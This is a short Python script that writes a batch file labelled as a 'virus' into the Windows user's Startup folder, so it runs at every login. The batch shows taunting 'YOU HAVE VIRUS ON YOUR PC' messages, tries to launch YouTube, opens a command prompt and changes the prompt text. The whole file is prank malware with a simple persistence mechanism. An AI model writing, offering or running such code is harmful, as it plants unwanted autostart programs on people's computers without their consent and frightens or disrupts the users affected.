import os

virus_code = '''
ECHO OFF
COLOR 2e
TITLE YOU HAVE VIRUS ON YOUR PC (;
ECHO Hello
ECHO Your PC have virus
ECHO HAHAHAHHAHAHAH (;
START YouTube
CMD
PROMPT YOU HAVE VIRUS ON YOUR PC (;
ECHO ON
'''

#print(os.getlogin())
url = ("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.bat" % os.getlogin())

f = open(str(url), "w")
f.write(virus_code)
f.close()


#path = os.path.realpath(url)
#os.startfile(path)